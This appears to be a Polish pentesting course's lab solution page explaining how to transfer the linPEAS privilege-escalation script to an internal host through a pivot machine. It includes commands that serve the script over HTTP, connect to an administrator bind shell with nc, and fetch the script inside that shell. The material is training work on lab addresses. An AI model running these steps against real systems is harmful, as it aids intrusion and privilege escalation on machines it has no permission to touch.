---
title: "7.4p - Przeniesienie linPEAS przez HTTP"
order: 16
---

> **Uwaga do rozwiązania:** Adres `192.168.200.107` to interfejs maszyny pośredniej widoczny z sieci wewnętrznej. Serwer HTTP uruchom w katalogu z `linpeas.sh` i pozostaw działający na czas pobierania.

```bash
#Kali - copy linpeas.sh if missing on the homework server:
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh student@192.168.100.107:/home/student

#Terminal 1 - student@192.168.100.107:
python3 -m http.server 1234

#Terminal 2 - student@192.168.100.107:
nc 192.168.200.157 1234
#Inside the bind shell (admin):
wget http://192.168.200.107:1234/linpeas.sh
```
